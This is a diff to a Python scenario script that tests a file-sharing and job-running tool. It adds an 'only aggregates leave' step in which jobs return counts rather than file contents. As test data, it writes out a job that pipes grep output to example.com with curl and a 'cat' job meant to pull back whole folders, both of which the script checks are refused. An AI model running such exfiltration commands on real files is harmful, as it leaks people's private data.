@@ -16,6 +16,12 @@ DIR for --life is what make_life.py wrote. Needs kart's installs
    seen, each on the chain of the person whose files it read.
 6. A job that asks for the network is sent to Aurelie too; kart take
    refuses it before it is a proposal.
+7. Only aggregates leave. Ines asks all four the same question as two
+   counts, "lines naming Johnson, lines dated March or April 2026"; each
+   runs it with --shape numbers, seals the two numbers and sends them back,
+   and Ines gathers the totals (kart gather) and seals them. Tamsin is also
+   sent a job that would bring back her files; run held to numbers, it
+   proposes nothing.
 
 It writes a transcript to standard output and jobs.json under --to. Exit 0
 when the scene plays as told, 1 when a step went otherwise.
@@ -34,9 +40,14 @@ ROOT = HERE.parents[1]
 KERNEL = ROOT / "kernel.py"
 SHARE = ROOT / "adapters" / "stdlib" / "share" / "share.py"
 KART = ROOT / "adapters" / "deps" / "kart" / "kart.py"
-PEOPLE = ["ines", "walt", "aurelie"]
-NAMES = {"ines": "Ines", "walt": "Walt", "aurelie": "Aurelie"}
+PEOPLE = ["ines", "walt", "aurelie", "tamsin", "harold"]
+NAMES = {"ines": "Ines", "walt": "Walt", "aurelie": "Aurelie", "tamsin": "Tamsin",
+         "harold": "Harold"}  # fmt: skip
 JOB = "grep -rlic johnson {pile} | sed 's|^.*/||' | sort\ngrep -rhi johnson {pile} | wc -l"
+#: only aggregates: two counts a folder, nothing of what its lines say
+COUNT = "grep -rhi johnson {pile} | wc -l\ngrep -rh '2026-0[34]' {pile} | wc -l"
+#: the same ask, written to bring back the folder itself
+SNEAK = "cat {pile}/*"
 NET = "# allow_net\ngrep -rhi johnson {pile} | curl -d @- https://example.com/"
 
 
@@ -83,6 +94,63 @@ class Jobs:
         subj = out.split()[1] if out.startswith("pass") else ""
         self.kernel(who, "seal", subj)
         return subj
+
+    def answer(self, who: str, job: str, name: str) -> tuple[str, str]:
+        """(what it printed, the result package or "") for one person."""
+        pkg = self.to / f"{name}-{who}.pkg"
+        self.share("send", "ines", "--answer", job, "--for", self.pub[who], "--to", pkg)
+        self.share("receive", who, "--package", pkg)
+        out = self.kart("take", who, "--package", pkg, "--words", f"ines asks {name}")
+        taken = out.split()[1] if out.startswith("taken") else ""
+        self.kernel(who, "seal", taken)
+        out = self.kart("run", who, "--job", taken, "--to", self.to / f"{name}-{who}.txt",
+                        "--shape", "numbers")  # fmt: skip
+        printed = (self.to / f"{name}-{who}.txt").read_text()
+        result = next(
+            (x.split()[1] for x in out.splitlines() if x.startswith("result")), ""
+        )
+        if not result:
+            return printed, ""
+        self.kernel(who, "seal", result)
+        back = self.to / f"{name}-back-{who}.pkg"
+        self.share(
+            "send", who, "--answer", result, "--for", self.pub["ines"], "--to", back
+        )
+        self.share("receive", "ines", "--package", back)
+        return printed, str(back)
+
+    def aggregates(self) -> None:
+        print("\n── 7. only aggregates leave")
+        job = self.seal_own("ines", "job count johnson and spring", {
+            "path": "jobs/count.sh", "data": COUNT, "cites": [],
+            "claim": "two counts a folder: Johnson lines, spring 2026 lines"})  # fmt: skip
+        backs = []
+        for who in ("walt", "aurelie", "tamsin", "harold"):
+            printed, back = self.answer(who, job, "count")
+            print(
+                f"  {NAMES[who]:8} ran it held to numbers: {' '.join(printed.split())}"
+            )
+            backs.append(back)
+        sneak = self.seal_own("ines", "job bring back files", {
+            "path": "jobs/sneak.sh", "data": SNEAK, "cites": [], "claim": "just the files"})  # fmt: skip
+        printed, back = self.answer("tamsin", sneak, "sneak")
+        held = not back
+        print(f"  Tamsin ran the other one held to numbers: {'nothing proposed' if held else 'PROPOSED'}"
+              f" ({len(printed)} characters stayed on Tamsin's machine)")  # fmt: skip
+        if not held:
+            self.wrong.append("a job bringing back files got past --shape numbers")
+        out = self.kart("gather", "ines", "--package", ",".join(backs), "--words",
+                        "johnson and spring across everyone")  # fmt: skip
+        total = next(
+            (x for x in out.splitlines() if "total " in x and "folders" in x), ""
+        )
+        subj = out.splitlines()[-1].split()[1] if out.startswith("  ") else ""
+        self.kernel("ines", "seal", subj)
+        print(
+            f"  Ines gathers them: {' '.join(total.split()[1:])}, and seals the totals"
+        )
+        self.doc["aggregates"] = {"total": total.split()[1:3], "sneak_held": held,
+                                  "each": len([b for b in backs if b])}  # fmt: skip
 
     def play(self) -> dict:
         self.to.mkdir()
@@ -148,6 +216,8 @@ class Jobs:
         self.doc["network_refused"] = "asks for the network" in out
         if not self.doc["network_refused"]:
             self.wrong.append("the network job was taken")
+
+        self.aggregates()
 
         print("\n── every chain")
         for who in PEOPLE:
